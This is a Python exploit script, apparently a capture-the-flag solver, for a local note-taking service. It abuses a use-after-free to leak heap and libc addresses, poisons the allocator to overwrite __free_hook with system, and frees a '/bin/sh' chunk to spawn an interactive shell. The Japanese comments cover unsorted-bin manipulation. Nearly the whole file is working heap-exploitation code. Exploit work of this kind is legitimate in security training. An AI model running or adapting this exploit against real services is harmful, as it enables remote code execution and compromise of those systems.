#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, sys, logging

logging.basicConfig(level=logging.DEBUG, format="\x1b[93;41m[-] %(message)s \x1b[0m")

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str:
      delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until):
  _ = read_until(f, skip_until)                                                                                       
  return read_until(f)

def sendline(f, line):
  if type(line) is str: 
    line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    
def dbg(ss):
  fmt = f"{ss} : "
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f"{hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f"{val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(fmt)

def hexify(a):
  return int(a, 16)


############## Utils #################
def menu():
  _  = read_until(f, '1: create note')
  _ += read_until(f, '2: delete note')
  _ += read_until(f, '3: edit note')
  _ += read_until(f, '4: show note')
  _ += read_until(f, '5: exit')
  _ += read_until(f, 'Command >> ')
  #print(_)
  return;

def create_note(size, data):
  sendline(f, '1')
  sendline_after(f, '[*] Note data size:', str(size))
  sendline_after(f, '[*] Note data: ', data)
  idx = readline_after(f, '[+] Chunk stored Index: ') 
  idx = int(idx)
  print("chunk idx: %d"%idx)
  return menu(), idx

def delete_note(idx):
  sendline(f, '2')
  sendline_after(f, 'index:', str(idx))
  print("[+] free %d:"%idx)
  return menu()

def edit_note(idx, data):
  sendline(f, '3')
  sendline_after(f, 'index: ', str(idx))
  sendline_after(f, 'data: ', data)
  return menu()

def show_note(idx):
  sendline(f, '4')
  sendline_after(f, 'index: ', str(idx))
  note = readline_after(f, ': ')
  return note

#### plt/got, rop gadgets, symbs addrs and consts ####
ofs_av_top      = 0x3b5be0
ofs_malloc_hook = 0x3b5b70
ofs_free_hook   = 0x3b7e48
#ofs_onegadget   = 0x0c571f 
ofs_system      = 0x0430a0

banner = 'test'
HOST, PORT = '127.0.0.1', 1337 
logging.info(banner)
s, f = sock(HOST, PORT)


menu()
_, A = create_note(0x300,  b'A' * 0x100) # idx 0
_, B = create_note(0x300,  b'B' * 0x200) # idx 1
_, C = create_note(0x300,  pQ(0x420) * 34 + pQ(0x420) + pQ(0x1f1) * 4)
delete_note(B)
delete_note(A)
leak = uQ(show_note(A).strip()) # A->next = B
heapbase = leak - 0x310 - 0x10 
dbg("leak")
dbg("heapbase")

next_of_A = heapbase + 0x310 + 0x20
edit_note(A, pQ(next_of_A))
edit_note(B, pQ(0) + pQ(0x420 | 1) + pQ(0) * 2) 
_, X = create_note(0x300,  pQ(0x210 | 1) * 0x4)
_, Y = create_note(0x300,  pQ(0x00) * 2 + pQ(0x30) + pQ(0x421 | 1)) # 大きなチャンクが返る. 

delete_note(Y) # unsorted binを無理やりつなぐ. 

# resolve address 
leak = uQ(show_note(Y).strip())
libc_base   = leak - ofs_av_top  
malloc_hook = libc_base + ofs_malloc_hook 
free_hook   = libc_base + ofs_free_hook
addr_system = libc_base + ofs_system
#one_gadget  = libc_base + ofs_onegadget
dbg("libc_base")
dbg("malloc_hook")
dbg("free_hook")
dbg("addr_system")

## UAF-> AAW primitive malloc_hook->one_gadget
delete_note(C)
delete_note(X)
edit_note(X, pQ(free_hook))
_,freed = create_note(0x300, b"/bin/sh\00\n")
_,Z = create_note(0x300, pQ(addr_system))
input('gdb?')
sendline(f, '2')
sendline_after(f, ':', str(freed))
shell(s)